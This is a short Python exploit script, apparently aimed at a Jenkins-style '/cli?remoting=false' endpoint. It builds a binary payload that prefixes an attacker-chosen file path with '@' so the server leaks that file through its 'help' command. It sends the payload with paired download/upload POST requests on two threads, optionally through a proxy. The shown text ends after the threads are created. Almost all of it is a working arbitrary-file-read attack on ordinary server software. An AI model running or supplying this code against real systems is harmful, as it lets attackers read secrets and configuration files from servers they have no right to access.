import argparse
import threading
import http.client
import time
import uuid
import urllib.parse

def exploit_target(target_url, file_path, proxy):
    target = urllib.parse.urlparse(target_url)
    uuid_str = str(uuid.uuid4())
    data_bytes = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@' + file_path.encode() + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'
    print("Testing =>> " + target_url)

    def req1():
        conn = create_connection(target, proxy)
        conn.request("POST", "/cli?remoting=false", headers={
            "Session": uuid_str,
            "Side": "download"
        })
        print(f'RESPONSE: {conn.getresponse().read()}')

    def req2():
        conn = create_connection(target, proxy)
        conn.request("POST", "/cli?remoting=false", headers={
            "Session": uuid_str,
            "Side": "upload",
            "Content-type": "application/octet-stream"
        }, body=data_bytes)

    def create_connection(target, proxy):
        if proxy:
            return http.client.HTTPConnection(proxy.hostname, proxy.port)
        return http.client.HTTPConnection(target.netloc)

    t1 = threading.Thread(target=req1)
    t2 = threading.Thread(target=req2)

